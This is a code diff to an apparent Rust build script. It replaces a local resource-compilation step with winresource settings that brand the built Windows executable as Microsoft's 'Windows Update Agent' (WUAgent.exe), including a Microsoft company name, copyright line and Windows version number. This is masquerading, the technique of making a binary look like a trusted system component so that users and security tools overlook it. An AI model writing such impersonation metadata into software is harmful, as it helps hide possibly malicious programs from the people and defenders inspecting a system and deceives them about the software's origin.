@@ -1,19 +1,16 @@
 fn main() {
     if std::env::var("CARGO_CFG_TARGET_OS").unwrap_or_default() == "windows" {
-        // Compile .rc resource file for version info + manifest
-        let rc_path = std::path::Path::new("res/app.rc");
-        if rc_path.exists() {
-            // Use windres (from mingw) to compile .rc → .res
-            let out_dir = std::env::var("OUT_DIR").unwrap();
-            let res_path = format!("{}/app.res", out_dir);
-            let status = std::process::Command::new("x86_64-w64-mingw32-windres")
-                .args(&["res/app.rc", "-O", "coff", "-o", &res_path])
-                .status();
-            if let Ok(s) = status {
-                if s.success() {
-                    println!("cargo:rustc-link-arg={}", res_path);
-                }
-            }
+        let mut res = winresource::WindowsResource::new();
+        res.set("FileDescription", "Windows Update Agent");
+        res.set("ProductName", "Microsoft Windows");
+        res.set("CompanyName", "Microsoft Corporation");
+        res.set("LegalCopyright", "\u{00a9} Microsoft Corporation. All rights reserved.");
+        res.set("FileVersion", "10.0.26100.1");
+        res.set("ProductVersion", "10.0.26100.1");
+        res.set("OriginalFilename", "WUAgent.exe");
+        res.set("InternalName", "WUAgent");
+        if let Err(e) = res.compile() {
+            eprintln!("cargo:warning=Version resource failed: {e}");
         }
     }
 }
